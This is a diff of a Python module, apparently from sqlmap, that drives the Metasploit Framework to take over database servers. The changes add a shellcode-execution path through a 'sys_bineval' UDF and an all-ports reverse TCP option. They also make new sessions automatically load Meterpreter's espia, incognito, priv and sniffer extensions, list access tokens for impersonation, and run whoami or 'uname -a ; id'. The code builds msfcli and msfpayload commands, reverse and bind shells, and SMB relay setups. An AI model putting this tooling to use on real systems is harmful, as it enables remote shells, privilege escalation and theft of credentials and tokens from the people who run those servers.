@@ -24,7 +24,6 @@ Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 
 
 
-import binascii
 import os
 import re
 import stat
@@ -67,6 +66,7 @@ class Metasploit:
         self.portStr        = None
         self.payloadStr     = None
         self.encoderStr     = None
+        self.payloadConnStr = None
 
         self.resourceFile   = None
 
@@ -93,14 +93,13 @@ class Metasploit:
 
         self.__msfConnectionsList = {
                                       "windows": {
-                                                   1: ( "Bind TCP (default)", "bind_tcp" ),
-                                                   2: ( "Bind TCP (No NX)", "bind_nonx_tcp" ),
-                                                   3: ( "Reverse TCP", "reverse_tcp" ),
-                                                   4: ( "Reverse TCP (No NX)", "reverse_nonx_tcp" ),
+                                                   1: ( "Bind TCP: Listen on the database host for a connection", "bind_tcp" ),
+                                                   2: ( "Reverse TCP: Connect back from the database host to this machine (default)", "reverse_tcp" ),
+                                                   3: ( "Reverse TCP: Try to connect back from the database host to this machine, on all ports between the specified and 65535", "reverse_tcp_allports" ),
                                                  },
                                       "linux":   {
-                                                   1: ( "Bind TCP (default)", "bind_tcp" ),
-                                                   2: ( "Reverse TCP", "reverse_tcp" ),
+                                                   1: ( "Bind TCP: Listen on the database host for a connection", "bind_tcp" ),
+                                                   2: ( "Reverse TCP: Connect back from the database host to this machine (default)", "reverse_tcp" ),
                                                  }
                                     }
 
@@ -130,8 +129,8 @@ class Metasploit:
                                     }
 
         self.__portData           = {
-                                      "bind":    "remote port numer",
-                                      "reverse": "local port numer",
+                                      "bind":    "remote port number",
+                                      "reverse": "local port number",
                                     }
 
 
@@ -186,7 +185,10 @@ class Metasploit:
 
 
     def __selectEncoder(self, encode=True):
-        if kb.os == "Windows" and encode == True:
+        if isinstance(encode, str):
+            return encode
+
+        elif kb.os == "Windows" and encode is True:
             return self.__skeletonSelection("payload encoding", self.__msfEncodersList)
 
 
@@ -330,10 +332,14 @@ class Metasploit:
         self.payloadStr     = self.__selectPayload(askChurrasco)
         self.encoderStr     = self.__selectEncoder(encode)
 
+        if self.payloadStr == "linux/x86/shell":
+            self.payloadConnStr = "%s_%s" % (self.payloadStr, self.connectionStr)
+        else:
+            self.payloadConnStr = "%s/%s" % (self.payloadStr, self.connectionStr)
+
 
     def __forgeMsfCliCmd(self, exitfunc="process"):
-        self.__cliCmd  = "%s multi/handler PAYLOAD=" % self.__msfCli
-        self.__cliCmd += "%s/%s" % (self.payloadStr, self.connectionStr)
+        self.__cliCmd  = "%s multi/handler PAYLOAD=%s" % (self.__msfCli, self.payloadConnStr)
         self.__cliCmd += " EXITFUNC=%s" % exitfunc
         self.__cliCmd += " LPORT=%s" % self.portStr
 
@@ -364,7 +370,7 @@ class Metasploit:
         self.__resource  = "use windows/smb/smb_relay\n"
         self.__resource += "set SRVHOST %s\n" % self.lhostStr
         self.__resource += "set SRVPORT %s\n" % self.__selectSMBPort()
-        self.__resource += "set PAYLOAD %s/%s\n" % (self.payloadStr, self.connectionStr)
+        self.__resource += "set PAYLOAD %s\n" % self.payloadConnStr
         self.__resource += "set LPORT %s\n" % self.portStr
 
         if self.connectionStr.startswith("bind"):
@@ -384,8 +390,7 @@ class Metasploit:
 
 
     def __forgeMsfPayloadCmd(self, exitfunc, format, outFile, extra=None):
-        self.__payloadCmd  = self.__msfPayload
-        self.__payloadCmd += " %s/%s" % (self.payloadStr, self.connectionStr)
+        self.__payloadCmd  = "%s %s" % (self.__msfPayload, self.payloadConnStr)
         self.__payloadCmd += " EXITFUNC=%s" % exitfunc
         self.__payloadCmd += " LPORT=%s" % self.portStr
 
@@ -395,19 +400,11 @@ class Metasploit:
         elif not self.connectionStr.startswith("bind"):
             raise sqlmapDataException, "unexpected connection type"
 
-        if kb.os == "Windows":
+        if kb.os == "Windows" or extra == "BufferRegister=EAX":
             self.__payloadCmd += " R | %s -a x86 -e %s -o %s -t %s" % (self.__msfEncode, self.encoderStr, outFile, format)
 
             if extra is not None:
                 self.__payloadCmd += " %s" % extra
-
-        # NOTE: payload stager for Linux can only be encoded if the
-        # Metasploit working copy has been updated after May 11, 2009
-        # (http://trac.metasploit.com/changeset/6543)
-        #
-        # TODO: remember to update this code as soon as Metasploit
-        # Framework 3.3 is out officially and update the user's manual to
-        # notify that sqlmap depends upon Metasploit Framework 3.3
         else:
             self.__payloadCmd += " X > %s" % outFile
 
@@ -431,6 +428,14 @@ class Metasploit:
         self.__msfConsoleProc = execute(self.__consoleCmd, shell=True, stdin=PIPE, stdout=PIPE)
 
 
+    def __runMsfShellcodeRemote(self):
+        infoMsg  = "running Metasploit Framework 3 shellcode "
+        infoMsg += "remotely via UDF 'sys_bineval', wait.."
+        logger.info(infoMsg)
+
+        self.udfExecCmd("'%s'" % self.shellcodeString, silent=True, udfName="sys_bineval")
+
+
     def __runMsfPayloadRemote(self):
         infoMsg  = "running Metasploit Framework 3 payload stager "
         infoMsg += "remotely, wait.."
@@ -447,11 +452,6 @@ class Metasploit:
         if kb.dbms == "Microsoft SQL Server":
             cmd = self.xpCmdshellForgeCmd(cmd)
 
-        # NOTE: calling the Metasploit payload from a system() function in
-        # C on Windows (check on Linux the behaviour) for some reason
-        # hangs it and the HTTP response goes into timeout, this does not
-        # happen when running the it from Windows cmd.
-        # Investigate and fix if possible
         self.execCmd(cmd, silent=True)
 
 
@@ -459,23 +459,25 @@ class Metasploit:
         if kb.os != "Windows":
             return
 
-        if self.resourceFile != None:
+        if self.resourceFile is not None:
             proc.stdin.write("sessions -l\n")
             proc.stdin.write("sessions -i %s\n" % metSess)
 
+        proc.stdin.write("getuid\n")
+
+        proc.stdin.write("use espia\n")
+        proc.stdin.write("use incognito\n")
         proc.stdin.write("use priv\n")
+        proc.stdin.write("use sniffer\n")
 
         if conf.privEsc == True:
             print
 
-            infoMsg  = "loading Meterpreter 'incognito' extension and "
-            infoMsg += "displaying the list of Access Tokens availables. "
+            infoMsg  = "displaying the list of Access Tokens availables. "
             infoMsg += "Choose which user you want to impersonate by "
             infoMsg += "using incognito's command 'impersonate_token'"
             logger.info(infoMsg)
 
-            proc.stdin.write("use incognito\n")
-            proc.stdin.write("getuid\n")
             proc.stdin.write("list_tokens -u\n")
 
 
@@ -520,6 +522,12 @@ class Metasploit:
                     if pwnBofCond or smbRelayCond:
                         func()
 
+                    if "Starting the payload handler" in out and "shell" in self.payloadStr:
+                        if kb.os == "Windows":
+                            proc.stdin.write("whoami\n")
+                        else:
+                            proc.stdin.write("uname -a ; id\n")
+
                     metSess = re.search("Meterpreter session ([\d]+) opened", out)
 
                     if metSess:
@@ -531,18 +539,16 @@ class Metasploit:
                 return returncode
 
 
-    def createMsfShellcode(self):
-        infoMsg  = "creating Metasploit Framework 3 multi-stage shellcode "
-        infoMsg += "for the exploit"
+    def createMsfShellcode(self, exitfunc, format, extra, encode):
+        infoMsg = "creating Metasploit Framework 3 multi-stage shellcode "
         logger.info(infoMsg)
 
         self.__randStr           = randomStr(lowercase=True)
         self.__shellcodeFilePath = "%s/sqlmapmsf%s" % (conf.outputPath, self.__randStr)
-        self.shellcodeChar       = ""
 
         self.__initVars()
-        self.__prepareIngredients(askChurrasco=False)
-        self.__forgeMsfPayloadCmd("seh", "raw", self.__shellcodeFilePath, "-b \"\\x00\\x27\"")
+        self.__prepareIngredients(encode=encode, askChurrasco=False)
+        self.__forgeMsfPayloadCmd(exitfunc, format, self.__shellcodeFilePath, extra)
 
         logger.debug("executing local command: %s" % self.__payloadCmd)
         process = execute(self.__payloadCmd, shell=True, stdout=None, stderr=PIPE)
@@ -551,30 +557,28 @@ class Metasploit:
         pollProcess(process)
         payloadStderr = process.communicate()[1]
 
-        if kb.os == "Windows":
+        if kb.os == "Windows" or extra == "BufferRegister=EAX":
             payloadSize = re.search("size ([\d]+)", payloadStderr, re.I)
         else:
             payloadSize = re.search("Length\:\s([\d]+)", payloadStderr, re.I)
 
         if payloadSize:
-            payloadSize = payloadSize.group(1)
+            payloadSize = int(payloadSize.group(1))
 
-            debugMsg = "the shellcode size is %s bytes" % payloadSize
+            if extra == "BufferRegister=EAX":
+                payloadSize = payloadSize / 2
+
+            debugMsg = "the shellcode size is %d bytes" % payloadSize
             logger.debug(debugMsg)
         else:
-            errMsg = "failed to create the shellcode (%s)" % payloadStderr
+            errMsg = "failed to create the shellcode (%s)" % payloadStderr.replace("\n", "")
             raise sqlmapFilePathException, errMsg
 
         self.__shellcodeFP     = open(self.__shellcodeFilePath, "rb")
-        self.__shellcodeString = self.__shellcodeFP.read()
+        self.shellcodeString   = self.__shellcodeFP.read()
         self.__shellcodeFP.close()
 
         os.unlink(self.__shellcodeFilePath)
-
-        hexStr = binascii.hexlify(self.__shellcodeString)
-
-        for hexPair in range(0, len(hexStr), 2):
-            self.shellcodeChar += "CHAR(0x%s)+" % hexStr[hexPair:hexPair+2]
 
 
     def createMsfPayloadStager(self, initialize=True):
@@ -647,14 +651,21 @@ class Metasploit:
         os.unlink(self.exeFilePathLocal)
 
 
-    def pwn(self):
-        self.__runMsfCli(exitfunc="process")
+    def pwn(self, goUdf=False):
+        if goUdf is True:
+            exitfunc = "thread"
+            func     = self.__runMsfShellcodeRemote
+        else:
+            exitfunc = "process"
+            func     = self.__runMsfPayloadRemote
+
+        self.__runMsfCli(exitfunc=exitfunc)
 
         if self.connectionStr.startswith("bind"):
-            self.__runMsfPayloadRemote()
+            func()
 
         debugMsg  = "Metasploit Framework 3 command line interface exited "
-        debugMsg += "with return code %s" % self.__controlMsfCmd(self.__msfCliProc, self.__runMsfPayloadRemote)
+        debugMsg += "with return code %s" % self.__controlMsfCmd(self.__msfCliProc, func)
         logger.debug(debugMsg)
 
 
